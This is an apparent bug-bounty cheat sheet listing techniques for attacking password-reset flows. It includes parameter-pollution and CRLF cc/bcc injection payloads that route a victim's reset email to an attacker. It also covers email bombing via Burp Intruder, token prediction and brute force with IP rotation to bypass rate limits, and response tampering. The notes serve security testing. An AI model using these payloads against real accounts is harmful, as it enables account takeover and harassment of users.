## Account takeover using password reset manipulating email parameter

Using the post request, add attacker email by :

- attacker email as second parameter using `&` : `email=victim@mail.com&email=attacker@email.com`

- Same principle but using `%20`

- Same principle but using `|`

- Same principle but using `,`

- Using `cc` : `email=victim@email.com%0a%0dcc:attacker@email.com`

- Same principle using `bcc`

- In json array : {"email":["victim@email.com","attacker@email.com"]}

---

## No rate limiting : email bombing

- Intercept password request
- Send to intruder
- Use null payload

https://hackerone.com/reports/794395

---

## Find how password reset token is generated

Could be :
- Timestamp 
- UserID
- Email of the user
- firstanme / lastname
- Date of birth
- Cryptogprahy 
- ...

Use Burp Sequencer to find the randomness or predictability of tokens.

---

## Manipulate the response

- Change the response if you have something like unauthorized and see if you are successful.

---

## Bruteforce token

- Try to bruteforce the reset token using burpsuite and IP rotator to bypass IP based rate limit.

---

## Try using your own token with another account.

---



